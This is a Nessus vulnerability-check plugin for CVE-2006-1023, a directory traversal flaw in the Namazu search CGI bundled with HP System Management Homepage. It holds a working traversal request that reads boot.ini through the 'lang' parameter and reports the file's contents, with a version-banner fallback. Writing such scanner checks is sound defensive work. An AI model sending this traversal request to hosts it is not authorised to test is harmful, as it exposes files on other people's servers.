#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20988);
  script_version("$Revision: 1.8 $");

  script_cve_id("CVE-2006-1023");
  script_bugtraq_id(16876);
  script_xref(name:"OSVDB", value:"23569");

  script_name(english:"HP System Management Homepage (SMH) on Windows Namazu lang Parameter Traversal Arbitrary File Access");
  script_summary(english:"Checks for namazu lang parameter directory traversal vulnerability in HP System Management Homepage");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running HP System Management Homepage
(SMH), a web-based management interface for ProLiant and Integrity
servers. 

The version of HP SMH on the remote host includes a version of the
search engine Namazu that reportedly fails to validate user input to
the 'lang' parameter of the 'namazu.cgi' script.  An attacker may be
able to exploit this issue to access files on the remote host via
directory traversal." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/426345/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Update HP SMH's .namazurc configuration file according to the vendor
advisory." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();


  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 2301, 2381);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:2381);


# Make sure the banner is from HP SHM.
banner = get_http_banner(port:port);
if (!banner || "System Management Homepage" >!< banner) exit(0);


# nb: keepalives seem to prevent this from returning any results.
http_disable_keep_alive();

# Try to exploit the flaw to read a file.
#
# nb: this requires that SHM be configured to allow anonymous
#     access to unsecured pages.
file = "/../../../../../../../../../../../../../boot.ini";
req = string(
  "GET /hphelp/WEB_INF/cgi/namazu.cgi?lang=", file, " HTTP/1.0\r\n",
  "Host: ", get_host_name(), "\r\n",
  "\r\n"
);
r = http_send_recv_buf(port: port, data: req);
if (isnull(r)) exit(0);

res = strcat(r[0], r[1], '\r\n', r[2]);
# There's a problem if looks like boot.ini.
if ("[boot loader]">< res) {
  contents = strstr(res, "[boot loader]");
  if (isnull(contents)) contents = res;

  report = string(
    "Here are the contents of the file '\\boot.ini' that\n",
    "Nessus was able to read from the remote host :\n",
    "\n",
    contents
  );
  security_warning(port:port, extra:report);
  exit(0);
}


# If we're paranoid...
if (report_paranoia > 1) {
  if (egrep(pattern:"^Server: .*System Management Homepage/2\.(0\.|1\.[0-4]\.)", string:banner)) {
    report = string(
      "Nessus has determined the flaw exists with the application based\n",
      "only on the version in the web server's banner. Since the\n",
      "recommended solution involves a configuration change, this may\n",
      "be a false-positive.\n"
    );
    security_warning(port:port, extra:report);
  }
}
